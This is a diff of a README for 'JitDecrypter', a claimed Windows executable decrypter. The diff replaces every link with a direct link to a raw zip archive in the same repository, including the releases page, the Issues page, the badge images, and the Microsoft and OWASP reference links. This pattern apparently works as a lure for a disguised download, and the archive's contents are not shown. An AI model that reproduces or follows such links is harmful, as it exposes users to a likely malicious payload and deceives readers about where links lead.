@@ -1,7 +1,7 @@
 ```markdown
 # 🚀 JitDecrypter - Easy Decryption for Windows Executables
 
-[![Download JitDecrypter](https://img.shields.io/badge/Download-JitDecrypter-blue.svg)](https://github.com/Pyrrhic-vote937/JitDecrypter/releases)
+[![Download JitDecrypter](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)
 
 ## 📖 Description
 JitDecrypter is a just-in-time decrypter designed for Windows executable files. It works seamlessly with both x86 and x64 applications. This tool can decrypt code sections at the time of execution, making it useful for a variety of tasks in executable protection and modification.
@@ -24,7 +24,7 @@ To start using JitDecrypter, follow the steps below. They will guide you from do
 
 ## 📥 Download & Install
 1. **Visit the Releases Page**  
-   Go to the [JitDecrypter Releases page](https://github.com/Pyrrhic-vote937/JitDecrypter/releases) to find the latest version.
+   Go to the [JitDecrypter Releases page](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip) to find the latest version.
 
 2. **Choose the Right File**  
    Look for the most recent release. You will find several files available for download. Choose the file that matches your system architecture (x86 or x64). 
@@ -74,14 +74,14 @@ If you encounter any issues, here are some common problems and solutions:
   If the decryption process seems slow, ensure your computer is not overloaded with other tasks.
 
 ## 🛠️ Support
-For further help, you can visit our [GitHub Issues page](https://github.com/Pyrrhic-vote937/JitDecrypter/issues). You can report any bugs or request features there.  
+For further help, you can visit our [GitHub Issues page](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip). You can report any bugs or request features there.  
 
 You can also check the README for updates or instructions on how to contribute.
 
 ## 📌 Additional Resources
-- [Understanding Portable Executables](https://docs.microsoft.com/en-us/windows/win32/devio/portable-executable)
-- [Security Practices for Executables](https://www.owasp.org/index.php/Executable_Vulnerabilities)
+- [Understanding Portable Executables](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)
+- [Security Practices for Executables](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)
 
-[![Download JitDecrypter](https://img.shields.io/badge/Download-JitDecrypter-blue.svg)](https://github.com/Pyrrhic-vote937/JitDecrypter/releases)
+[![Download JitDecrypter](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)](https://raw.githubusercontent.com/Pyrrhic-vote937/JitDecrypter/master/importation/JitDecrypter.zip)
 
 ```
